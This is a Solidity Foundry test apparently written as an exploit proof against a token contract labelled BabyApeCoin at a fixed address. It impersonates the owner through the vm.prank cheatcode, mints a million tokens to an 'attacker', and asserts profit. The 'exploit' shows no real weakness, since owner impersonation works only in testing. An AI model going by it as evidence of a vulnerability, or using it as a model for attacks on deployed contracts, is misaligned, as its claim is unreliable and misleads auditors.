// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBabyApeCoin {
    function owner() external view returns (address);
    function mint(address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);
    IBabyApeCoin targetInstance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        targetInstance = IBabyApeCoin(TARGET);
        vm.label(TARGET, "BabyApeCoin");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalance = targetInstance.balanceOf(attacker);

        // Get the current owner
        address owner = targetInstance.owner();

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);
        targetInstance.mint(attacker, 1_000_000 * 1e18);

        // Verify the attacker's balance increased
        uint256 finalBalance = targetInstance.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after mint");
        uint256 finalBalanceERC20 = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
